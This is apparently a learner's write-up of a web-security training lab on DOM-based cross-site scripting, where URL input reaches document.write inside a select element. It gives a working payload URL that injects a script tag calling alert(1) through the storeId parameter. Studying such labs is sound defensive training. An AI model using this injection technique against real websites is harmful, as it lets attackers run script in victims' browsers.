Title: DOM XSS in document.write sink using source location.search inside a select element
Level: Practitioner
Desc:  This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 


Vulnerable code:
![image](https://github.com/user-attachments/assets/7a8debff-9337-49d3-bd50-dfefc42ddade)

We can see, that we can add storeId in URL.



payload: `https://0a0a005904f3baf3833c73ef00320024.web-security-academy.net/product?productId=2&storeId=%3Cscript%3Ealert(1)%3C/script%3E`
![image](https://github.com/user-attachments/assets/1ed876ba-4ce0-4ddd-a76b-2ed7c7cc03cc)

